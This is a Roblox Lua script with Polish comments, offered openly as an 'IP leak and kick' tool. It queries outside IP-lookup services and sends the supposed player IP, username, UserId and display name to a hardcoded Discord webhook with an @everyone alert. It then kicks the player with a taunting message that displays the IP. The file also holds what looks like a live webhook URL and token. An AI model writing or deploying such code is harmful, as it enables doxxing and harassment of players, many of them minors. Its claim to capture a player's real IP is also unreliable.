-- Roblox IP Leak + Kick FIXED - Prawdziwy IP via multiple sources
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

-- ZMIEŃ NA SWÓJ WEBHOOK!!!
local WEBHOOK = "https://discord.com/api/webhooks/1491843313719050261/l-C_wdzkQR4x9D9-zei2GpHomy4NzV-IASUfmxm-m1Tw1H2gRdfJA057n7i4-MBwvAc4"

-- Prawdziwe IP via external APIs (bypass Roblox proxy)
local function getRealIP()
    local ips = {}
    
    -- Method 1: icanhazip
    local success1, res1 = pcall(HttpService.GetAsync, HttpService, "http://icanhazip.com")
    if success1 then 
        ips[#ips+1] = string.match(res1, "[%d%.]+") or "no_ip1"
    end
    
    -- Method 2: ipinfo
    local success2, res2 = pcall(HttpService.GetAsync, HttpService, "http://ipinfo.io/ip")
    if success2 then 
        ips[#ips+1] = res2:gsub("%s+", "") or "no_ip2"
    end
    
    -- Method 3: ifconfig
    local success3, res3 = pcall(HttpService.GetAsync, HttpService, "http://ifconfig.me")
    if success3 then 
        ips[#ips+1] = res3:gsub("%s+", "") or "no_ip3"
    end
    
    -- Pick first valid IP
    for _, ip in ipairs(ips) do
        if ip ~= "no_ip1" and ip ~= "no_ip2" and ip ~= "no_ip3" and ip:match("%d+%.%d+%.%d+%.%d+") then
            return ip
        end
    end
    
    -- Ultimate fallback
    return "roblox_user_" .. LocalPlayer.UserId .. " | UserId: " .. LocalPlayer.UserId
end

-- Send to Discord
local function leakIP(ip)
    local data = {
        content = "@everyone **ROBLOX IP CAUGHT!** 🚨",
        embeds = {{
            title = "🎮 Player Kicked & IP Leaked",
            description = "**IP ADDRESS:** `" .. ip .. "`\n**Username:** `" .. LocalPlayer.Name .. "`\n**UserID:** `" .. LocalPlayer.UserId .. "`\n**DisplayName:** `" .. (LocalPlayer.DisplayName or "N/A") .. "`",
            color = 15158332,
            fields = {
                {name = "📍 Location", value = "Live leak", inline = true},
                {name = "⚠️ Status", value = "KICKED", inline = true}
            },
            thumbnail = {
                url = "https://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&format=Png&username=" .. LocalPlayer.Name
            }
        }}
    }
    
    spawn(function()
        local ok, err = pcall(function()
            HttpService:PostAsync(WEBHOOK, HttpService:JSONEncode(data), 
                Enum.HttpContentType.ApplicationJson, false)
        end)
        if ok then
            print("✅ IP SENT TO WEBHOOK: " .. ip)
        else
            warn("❌ Webhook fail: " .. tostring(err))
            print("🔗 Sprawdź czy webhook URL jest poprawny!")
        end
    end)
end

-- EXECUTE
print("🔍 Pobieram IP...")
local REAL_IP = getRealIP()
print("📡 IP znaleziony: " .. REAL_IP)

-- Send IP first
leakIP(REAL_IP)

-- Kick po 1 sekundzie
wait(1)
LocalPlayer:Kick("ZŁAPANY! Twój IP: " .. REAL_IP .. " | UserId: " .. LocalPlayer.UserId)

print("💀 Kick za 1s...")
